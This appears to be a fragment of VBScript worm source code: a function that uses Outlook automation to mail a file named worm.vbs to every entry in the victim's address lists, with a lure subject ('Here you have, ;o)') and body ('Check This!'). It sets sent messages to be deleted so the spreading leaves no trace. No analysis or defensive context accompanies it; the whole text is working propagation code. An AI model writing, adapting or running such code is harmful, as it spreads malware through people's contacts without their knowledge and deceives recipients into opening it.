'-------------------------------
Function Outlook()
On Error Resume Next
Set OutlookApp = CreateObject("Outlook.Application")
If OutlookApp = "Outlook" Then
Set Mapi = OutlookApp.GetNameSpace("MAPI")
For Each Addresslist In Mapi.AddressLists
If Addresslist.AddressEntries.Count <> 0 Then
Addresslistcout = Addresslist.AddressEntries.Count
For AddList = 1 To Addresslistcout
Set msg = OutlookApp.CreateItem(0)
Set AdEntries = Addresslist.AddressEntries(AddList)
msg.To = AdEntries.Address
msg.Subject = "Here you have, ;o)"
msg.Body = "Hi:" & vbCrLf & "Check This!"
set Attachs=msg.Attachments
Attachs.Add "c:\window\worm.vbs"
msg.DeleteAfterSubmit = True
If msg.To <> "" Then
msg.Send
End If
Next
End If
Next
End If
End Function
'-------------------------------